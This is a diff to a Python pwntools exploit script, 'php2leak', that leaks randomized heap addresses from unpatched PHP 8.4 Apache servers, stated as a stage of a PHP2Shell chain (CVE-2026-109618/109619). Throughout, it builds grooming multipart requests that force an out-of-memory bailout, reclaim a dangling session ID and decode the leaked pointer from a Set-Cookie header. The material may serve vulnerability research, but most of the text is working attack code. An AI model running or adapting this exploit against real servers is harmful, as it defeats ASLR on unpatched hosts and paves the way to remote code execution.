@@ -1,17 +1,18 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-php2leak — remote ASLR leak via the SID constant (response body)
-================================================================
+php2leak: zero-code remote ASLR leak via Set-Cookie: PHPSESSID=
+===============================================================
 
-Implements the *ASLR-leak stage* of the PHP2Shell chain
+Implements the application-agnostic ASLR-leak stage of the PHP2Shell chain
 (CVE-2026-109618 + CVE-2026-109619, fixed in PHP 8.2.35 / 8.3.36 / 8.4.27 /
-8.5.12).  We only leak a randomized address; we do not achieve a shell.
+8.5.12). We only leak randomized heap addresses; we do not achieve a shell.
 
-Target: php:8.4.26-apache-bookworm (libphp.so, x86_64, NTS, stock prefork MPM).
+Target: php:8.4.26-apache-bookworm (libphp.so, x86_64, NTS, stock prefork MPM,
+default php.ini, completely inert index.php with no session calls or reflection).
 
 --------------------------------------------------------------------
-THE BUG (CVE-2026-109619)
+1. THE PRE-RINIT WINDOW & OOM BAILOUT (CVE-2026-109619 + CVE-2026-109618)
 --------------------------------------------------------------------
 PHP parses a multipart/form-data body during request startup, *before* any
 module RINIT runs (main/main.c):
@@ -21,63 +22,78 @@ module RINIT runs (main/main.c):
     zend_activate_modules();    /* RINIT runs only after the POST body   */
     PG(modules_activated) = 1;
 
-The session upload-progress feature initializes the session inside that
-Pre-RINIT window (ext/session/session.c).  When a later part of the body blows
-past memory_limit, _zend_bailout() longjmps out; PG(modules_activated) is still
-0, so php_request_shutdown() skips the session RSHUTDOWN hook, then
-shutdown_memory_manager() wipes the request heap.  The worker survives with
-PS(id) / PS(http_session_vars) still pointing into the freed heap (dangling).
-
-On the next request, before RINIT resets those globals, ext/session reads the
-stale PS(id) and reflects the reclaimed bytes back to us.
+When a multipart request triggers an OOM fatal inside php_hash_environment(),
+_zend_bailout() longjmps to php_request_shutdown(). Because
+PG(modules_activated) is still 0, zend_deactivate_modules() (including session
+RSHUTDOWN) is skipped, while shutdown_memory_manager() resets the request heap
+(keeping heap->main_chunk mapped and unmapping secondary chunks). Module
+globals in .bss survive into the next request on the same worker PID.
 
 --------------------------------------------------------------------
-THE REFLECTION (why the SID constant, not the cookie)
+2. ZERO-CODE EXFILTRATION VIA Set-Cookie: PHPSESSID=
 --------------------------------------------------------------------
-php_session_reset_id() builds the SID constant *unconditionally* — it does not
-depend on PS(send_cookie) (ext/session/session.c):
+At MULTIPART_EVENT_FILE_START (ext/session/session.c), PHP sets PS(send_cookie)
+to 0 before calling php_session_rfc1867_update() -> php_session_initialize().
+Passing PHPSESSID="\x00" (length 1 so FORMDATA captures it, yet starting with a
+NUL byte) enters the empty-ID branch in php_session_initialize():
 
-    if (PS(define_sid)) {
-        smart_str var = {0};
-        smart_str_appends(&var, PS(session_name));     // "PHPSESSID"
-        smart_str_appendc(&var, '=');
-        smart_str_appends(&var, ZSTR_VAL(PS(id)));     // dangling bytes, strlen
-        smart_str_0(&var);
-        REGISTER_STRINGL_CONSTANT("SID", ...);
+    PS(mod)->s_open(&PS(mod_data), ...);          /* ps_files (40B Bin #4)   */
+    if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
+        zend_string_release_ex(PS(id), 0);
+        PS(id) = PS(mod)->s_create_sid(&PS(mod_data)); /* 64B Bin #7         */
+        if (PS(use_cookies)) {
+            PS(send_cookie) = 1;                  /* flips send_cookie ON!   */
+        }
     }
+    php_session_reset_id():
+        if (PS(use_cookies) && PS(send_cookie)) {
+            php_session_send_cookie();            /* <-- OOM bailout HERE!   */
+            PS(send_cookie) = 0;                  /* <-- skipped on bailout! */
+        }
 
-The application-agnostic Set-Cookie: PHPSESSID= channel would be cleaner, but
-MULTIPART_EVENT_FILE_START force-clears PS(send_cookie) = 0, silencing it.  The
-SID constant is the channel that still works: the target script just does
-`echo SID`, and the raw reclaimed-heap bytes land in the response body.
+By exhausting all free 4 KB pages across all 64 Zend MM chunks (128 MB) and
+leaving one free Bin #15 (256 B) slot before UPLOAD_PROGRESS (consumed by
+progress->key), php_session_send_cookie()'s smart_str allocation (256 B,
+Bin #15) hits heap->limit and calls _zend_bailout() *before* PS(send_cookie)=0
+or php_session_flush(1) (s_close) can run.
+
+Three pointers in .bss now dangle into heap->main_chunk:
+  * PS(id)                (64 B, Bin #7)
+  * PS(mod_data)          (40 B, Bin #4: ps_files struct)
+  * PS(mod_data)->basedir (32 B, Bin #3: "/tmp" zend_string)
+
+Request 1 pre-allocates slots in heap->main_chunk for all three and frees them
+onto Zend MM's LIFO free_slot[] heads right before FILE_START, placing
+PS(mod_data) at page 0x57 + 0x410 (safely between Bin #6 slot 18's freelist
+pointer at +0x3f0 and shadow pointer at +0x420 on Request 2).
 
 --------------------------------------------------------------------
-WHAT WE LEAK
+3. RECLAIMING PS(id) AND DECODING THE 262-BYTE LEAK
 --------------------------------------------------------------------
-The leak request recycles the freed 64-byte PS(id) slot (Bin #7) with a packed
-PHP array c[0..39]="V"*20.  A packed array stores its values as a contiguous run
-of 16-byte zvals (Zend/zend_types.h), each holding a pointer to its value:
+On Request 2 (same HTTP/1.1 keep-alive connection, no file part so FILE_START
+does not reset PS(id)), a 64-element packed array d0[0..63]="V"*50 allocates an
+arPacked buffer (8-byte HT_MIN_MASK prefix + 64 * 16-byte zvals = 1032 B,
+Bin #24) over PS(id)'s freed page (page 0x6f + 0x140):
 
-    zval:  +0x00 zend_value (ptr to "V"*20 zend_string)
-           +0x08 u1.type_info = 0x0106  (IS_STRING | IS_TYPE_REFCOUNTED)
-           +0x0c u2
+    PS(id)+0x00..0x07  gc        <- d0[18].u1 = 0x0106
+    PS(id)+0x08..0x0f  h         <- d0[19].value.str (heap ptr)
+    PS(id)+0x10..0x17  len       <- d0[19].u1 = 0x0106, u2 = 0  (len = 262!)
+    PS(id)+0x18..0x1f  val[0..7] <- d0[20].value.str (8-byte heap ptr!)
 
-ZSTR_VAL(PS(id)) now points into that run.  smart_str_appends() copies it with
-strlen, i.e. the low 6 bytes of the first pointer up to its 0x00 high byte.
-Canonical x86_64 user-space addresses have 0x00 in the top two bytes, so:
-
-    ptr        = leaked6 + b"\x00\x00"     (little-endian)
-    chunk_base = ptr & ~0x1fffff           (Zend MM chunks are 2 MB aligned)
-
-This recovers the Zend MM chunk base — one ASLR-randomized address.  (Leaking
-the libphp.so base instead would require recycling the slot with a zend_object,
-whose +0x18 holds &std_object_handlers.)
+At MULTIPART_EVENT_END -> php_session_rfc1867_cleanup() -> php_session_initialize():
+  1. ps_open_files() cleanly closes the intact PS(mod_data) / basedir slots.
+  2. php_session_reset_id() sees PS(send_cookie) == 1, calls php_url_encode()
+     on all 262 bytes of ZSTR_VAL(PS(id)), and emits:
+         Set-Cookie: PHPSESSID=<URL-encoded 262 raw heap bytes>
+  3. Unquoting the first 8 bytes yields a full 64-bit pointer into
+     heap->main_chunk; masking the low 21 bits gives the 2 MB-aligned base.
 """
 
 import os
 import re
 import struct
 import sys
+import urllib.parse
 from pwn import remote, log, context
 
 context.log_level = "info"
@@ -85,23 +101,14 @@ context.log_level = "info"
 HOST = sys.argv[1] if len(sys.argv) > 1 else os.environ.get("TARGET_HOST", "target")
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else int(os.environ.get("TARGET_PORT", "80"))
 
-# Zend MM chunks are mmap'd on a 2 MB (0x200000) boundary, so masking off the
-# low 21 bits of any pointer inside the chunk yields the chunk base.
+# Zend MM chunks are mmap'd on a 2 MB (0x200000) boundary.
 CHUNK_MASK = ~0x1FFFFF & ((1 << 64) - 1)
 
 
 def mp(boundary, parts):
-    """Build a multipart/form-data body.
-
-    parts: list of dicts —
-        {"name": b"...", "value": b"..."}                     -> form field
-        {"name": b"...", "filename": b"...", "value": b"..."} -> file part
-        {"raw": b"..."}                                       -> verbatim bytes
-    """
+    """Build a multipart/form-data body."""
     out = b""
     for p in parts:
-        if "raw" in p:
-            out += p["raw"]; continue
         out += b"--" + boundary + b"\r\n"
         disp = b'Content-Disposition: form-data; name="' + p["name"] + b'"'
         if "filename" in p:
@@ -114,106 +121,120 @@ def mp(boundary, parts):
 
 
 def request(io, boundary, body):
-    """Send one HTTP/1.1 POST over the shared socket and read one response.
-
-    Both the arm and leak requests go over the SAME keep-alive connection:
-    with Apache prefork MPM one child serves a connection for its whole
-    lifetime, so both requests hit the same worker (same ASLR layout and the
-    same stale .bss module globals).  That is what makes the cross-request
-    use-after-free deterministic without any worker-pinning config.
-    """
-    head = (b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
-            b"Connection: keep-alive\r\n"
-            b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
-            b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n")
+    """Send one HTTP/1.1 POST over the shared keep-alive socket and read response."""
+    head = (
+        b"POST / HTTP/1.1\r\nHost: " + HOST.encode() + b"\r\n"
+        b"Connection: keep-alive\r\n"
+        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
+        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n"
+    )
     io.send(head + body)
 
-    # Read until end of headers, then drain exactly Content-Length body bytes
-    # (so the keep-alive socket is left positioned at the next response).
     data = b""
     while b"\r\n\r\n" not in data:
         c = io.recv(65536)
-        if not c: break
+        if not c:
+            break
         data += c
     hr, br = data.split(b"\r\n\r\n", 1)
     headers = {}
+    cookies = []
     for ln in hr.split(b"\r\n")[1:]:
         if b":" in ln:
-            k, v = ln.split(b":", 1); headers[k.strip().lower()] = v.strip()
+            k, v = ln.split(b":", 1)
+            kl = k.strip().lower()
+            headers[kl] = v.strip()
+            if kl == b"set-cookie":
+                cookies.append(v.strip())
     n = int(headers.get(b"content-length", b"0"))
     while len(br) < n:
         c = io.recv(65536)
-        if not c: break
+        if not c:
+            break
         br += c
-    return headers, br[:n]
+    return headers, cookies, br[:n]
 
 
-def arm_body(boundary):
-    """Request N — publish PS(id), then OOM to leave it dangling.
+def arm_body():
+    """Request 1: pin PS(id) + PS(mod_data) in main_chunk and OOM in php_session_send_cookie()."""
+    parts = []
 
-    Three pieces, in this exact order:
+    # 1. Stash small-bin strings low in heap->main_chunk (<= 8 top-level $_POST
+    #    keys so $_POST->arData stays small). Overwriting them with "" after the
+    #    amplifier pushes their main_chunk slots onto the LIFO heads of
+    #    heap->free_slot[], ensuring FILE_START + ps_open_files() + s_create_sid()
+    #    allocate inside main_chunk without requesting new 4 KB pages.
+    for i in range(16):
+        parts.append({"name": b"b3[%d]" % i, "value": b"S" * 5})     # 32 B (Bin #3: basedir "/tmp")
+    for i in range(2):
+        parts.append({"name": b"b5[%d]" % i, "value": b"S" * 20})    # 48 B (Bin #5)
+    for i in range(2):
+        parts.append({"name": b"b6[%d]" % i, "value": b"S" * 28})    # 56 B (Bin #6: HashTables)
+    parts.append({"name": b"b8", "value": b"S" * 50})                # 80 B (Bin #8)
+    parts.append({"name": b"b11", "value": b"S" * 96})               # 128 B (Bin #11: php_url_encode)
+    for i, ln in enumerate([120, 120, 280, 280, 530, 530]):          # Bins #12, #16, #20
+        parts.append({"name": b"sup[%d]" % i, "value": b"S" * ln})
+    for i in range(11):
+        parts.append({"name": b"s4[%d]" % i, "value": b"D" * 15})    # 40 B (Bin #4: ps_files)
+    for i in range(2):
+        parts.append({"name": b"s7[%d]" % i, "value": b"C" * 39})    # 64 B (Bin #7: PS(id))
 
-    1. PHP_SESSION_UPLOAD_PROGRESS form field -> progress->key is set, so the
-       session upload-progress callback takes its Pre-RINIT path.
+    # 2. Exhaust all remaining 4 KB pages across all 64 Zend MM chunks (128 MB)
+    #    while staying under post_max_size=8M, max_input_vars=1000, and
+    #    max_input_nesting_level=64:
+    #    - 846 empty uploads (filename="") x 62 deep (~6x $_FILES amplification)
+    #    - 32 x 64 KB (16-page) LRUN blocks
+    #    - 28 x 4 KB (1-page) LRUN mops
+    #    - 14 x 256 B (Bin #15) slots so progress->key takes slot 16/16 and
+    #      php_session_send_cookie()'s smart_str (Bin #15) triggers OOM!
+    for i in range(846):
+        parts.append({"name": b"g[%d]" % i + b"[a]" * 62, "filename": b"", "value": b""})
+    for idx in range(32):
+        parts.append({"name": b"q[%d]" % idx, "value": b"Q" * (16 * 4096 - 64)})
+    for idx in range(28):
+        parts.append({"name": b"p[%d]" % idx, "value": b"P" * 3500})
+    for idx in range(14):
+        parts.append({"name": b"e[%d]" % idx, "value": b"E" * 210})
 
-    2. PHPSESSID with value b"\\x00".  The upload-progress FORMDATA handler only
-       captures the sid when value_len > 0, so a truly-empty value would be
-       ignored and FILE_START would never fire.  b"\\x00" has length 1 (captured)
-       yet ZSTR_VAL(PS(id))[0]=='\\0', so php_session_initialize() *regenerates*
-       the id — that 64-byte Bin-#7 zend_string is the one that later dangles.
+    # 3. Release the stashed main_chunk slots onto LIFO free_slot[] heads.
+    #    Freeing s4[2,4,6,8,10] lands PS(mod_data) at page 0x57 + 0x410 (between
+    #    Bin #6 slot 18's next_free_slot at +0x3f0 and shadow ptr at +0x420).
+    for i in range(2):
+        parts.append({"name": b"b5[%d]" % i, "value": b""})
+    for i in range(2):
+        parts.append({"name": b"b6[%d]" % i, "value": b""})
+    parts.append({"name": b"b8", "value": b""})
+    parts.append({"name": b"b11", "value": b""})
+    for i in range(4):
+        parts.append({"name": b"sup[%d]" % i, "value": b""})
+    for i in [2, 4, 6, 8, 10]:
+        parts.append({"name": b"s4[%d]" % i, "value": b""})
+    for i in range(2):
+        parts.append({"name": b"s7[%d]" % i, "value": b""})
+    for i in range(16):
+        parts.append({"name": b"b3[%d]" % i, "value": b""})
 
-    3. A real file part ("f", filename="a") -> fires MULTIPART_EVENT_FILE_START,
-       which publishes PS(id) low in heap->main_chunk (the chunk that stays
-       mapped across the bailout).
-
-    Then the amplifier (below) pushes Zend MM past memory_limit so
-    _zend_bailout() aborts before RSHUTDOWN.
-    """
-    parts = [
-        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"pwn"},
-        {"name": b"PHPSESSID", "value": b"\x00"},
-        {"name": b"f", "filename": b"a", "value": b"x"},
-    ]
-
-    # Amplifier — Calif's empty-upload trick (main/rfc1867.c):
-    # a file part with filename="" is NOT counted toward max_file_uploads, but
-    # register_http_post_files_variable_ex() still builds all six $_FILES
-    # sub-entries (name / full_path / type / tmp_name / error / size) under the
-    # nested field name.  Six entries walking the same nested HashTable
-    # hierarchy ~= 6x the amplification of a plain POST field.
-    #
-    # 990 parts x 62 deep x 6 entries x ~376 B  ~=  132 MB  >  memory_limit=128M,
-    # while the body stays < 1 MB — inside post_max_size=8M, max_input_vars=1000
-    # and max_input_nesting_level=64.  (The plain a[][]... amplifier caps out at
-    # ~24 MB because of those two input limits.)
-    depth, fields = 62, 990
-    for i in range(fields):
-        parts.append({"name": b"g[%d]" % i + b"[a]" * depth,
-                      "filename": b"", "value": b""})
+    # 4. Arm UPLOAD_PROGRESS + PHPSESSID="\x00" + FILE_START -> s_create_sid()
+    #    sets PS(send_cookie)=1, then php_session_send_cookie() OOMs!
+    parts.append({"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"pwn"})
+    parts.append({"name": b"PHPSESSID", "value": b"\x00"})
+    parts.append({"name": b"f", "filename": b"a", "value": b"x"})
     return parts
 
 
-def leak_body(boundary):
-    """Request N+1 — recycle the freed PS(id) slot and reflect it via SID.
-
-    * No file part -> MULTIPART_EVENT_FILE_START never fires, so the Pre-RINIT
-      php_rinit_session(0) reset of PS(id) is skipped and the stale pointer
-      survives until php_session_rfc1867_cleanup() -> php_session_initialize()
-      -> php_session_reset_id() builds the SID constant from it.
-
-    * A short PHPSESSID value ("Z") keeps progress->sid set (so the cleanup
-      path is entered) but is only Bin #1, so it does not itself reclaim the
-      freed 64-byte Bin-#7 slot.
-
-    * The packed array c[0..39]="V"*20 does reclaim that slot: its arData is a
-      contiguous run of 40 zvals, each a pointer to a "V"*20 zend_string.
-    """
-    parts = [
-        {"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"leak"},
-        {"name": b"PHPSESSID", "value": b"Z"},
-    ]
-    for i in range(40):
-        parts.append({"name": b"c[%d]" % i, "value": b"V" * 20})
+def leak_body():
+    """Request 2: reclaim PS(id) with d0's arPacked and read Set-Cookie: PHPSESSID=."""
+    parts = []
+    # 64-element packed array d0 (arPacked = 1032 B, Bin #24) reclaims PS(id)'s
+    # page; "V"*50 uses Bin #8 (80 B) so page 0x57 (Bin #6, holding PS(mod_data)
+    # in an untouched slot) is not overwritten before ps_close_files() runs.
+    for i in range(64):
+        parts.append({"name": b"d0[%d]" % i, "value": b"V" * 50})
+    # No file part -> FILE_START does not fire; MULTIPART_EVENT_END calls
+    # php_session_rfc1867_cleanup() -> php_session_initialize() ->
+    # php_session_reset_id() -> php_session_send_cookie()!
+    parts.append({"name": b"PHP_SESSION_UPLOAD_PROGRESS", "value": b"leak"})
+    parts.append({"name": b"PHPSESSID", "value": b"Z"})
     return parts
 
 
@@ -221,38 +242,31 @@ def main():
     b = b"----Xdeadbeef"          # boundary is part of the heap-layout tuning
     io = remote(HOST, PORT)
 
-    # --- Request N: arm (publish PS(id), OOM -> dangling) ---
-    hd, bd = request(io, b, mp(b, arm_body(b)))
-    # The OOM bailout shows up as the "Allowed memory size ... exhausted" fatal
-    # in the response body (mod_php returns HTTP 200 with the error inline).
-    oom = b"Allowed memory size" in bd or b"exhausted" in bd
-    log.info("arm -> OOM bailout: %s", oom)
+    # --- Request 1: arm PS(id) + PS(send_cookie)=1 via OOM in php_session_send_cookie() ---
+    hd1, ck1, bd1 = request(io, b, mp(b, arm_body()))
+    oom = b"Allowed memory size" in bd1 and len(ck1) == 0
+    log.info("arm -> OOM inside php_session_send_cookie (no cookie sent in Req 1): %s", oom)
     if not oom:
-        log.warning("arm did not OOM; check memory_limit=128M and the "
-                    "empty-upload amplifier (990 parts x 62 deep)")
+        log.warning("arm did not hit the expected OOM window (cookies=%r, body=%r)", ck1, bd1[:120])
 
-    # --- Request N+1: leak via the SID constant (same keep-alive socket) ---
-    hd, bd = request(io, b, mp(b, leak_body(b)))
+    # --- Request 2: reclaim PS(id) and read Set-Cookie: PHPSESSID= (same socket) ---
+    hd2, ck2, bd2 = request(io, b, mp(b, leak_body()))
+    if not ck2:
+        log.failure("no Set-Cookie header in Request 2 response (body=%r)", bd2[:120])
+        return 1
 
-    # index.php echoes:  SID=PHPSESSID=<raw reclaimed bytes>\n
-    m = re.search(rb"SID=PHPSESSID=([^\r\n]*)", bd)
+    m = re.search(rb"PHPSESSID=([^;\r\n]+)", ck2[0])
     if not m:
-        log.failure("SID constant not found in response body:\n%r", bd)
+        log.failure("PHPSESSID not found in Set-Cookie: %r", ck2[0])
         return 1
 
-    raw = m.group(1)             # the strlen-truncated bytes (up to first NUL)
-    log.info("SID leaked %d bytes: %s", len(raw), raw.hex())
-
-    # A canonical heap pointer's low 6 bytes end at its 0x00 high byte, so we
-    # expect exactly 6 bytes here; anything less means the reclaim landed in the
-    # wrong bin (heap alignment shifted).
-    if len(raw) < 6:
-        log.warning("too few bytes leaked (reclaim landed wrong; re-run)")
+    raw = urllib.parse.unquote_to_bytes(m.group(1).decode("latin1"))
+    log.info("Set-Cookie leaked %d raw heap bytes (first 16B: %s)", len(raw), raw[:16].hex())
+    if len(raw) < 8:
+        log.failure("leaked fewer than 8 bytes (%d)", len(raw))
         return 1
 
-    # Reconstruct the 8-byte pointer (top two bytes of a canonical user-space
-    # address are 0x00) and mask to the 2 MB-aligned chunk base.
-    ptr = struct.unpack("<Q", raw[:6] + b"\x00\x00")[0]
+    ptr = struct.unpack_from("<Q", raw, 0)[0]
     chunk_base = ptr & CHUNK_MASK
     log.info("heap ptr = 0x%016x", ptr)
     log.success("Zend MM chunk base (ASLR): 0x%016x", chunk_base)
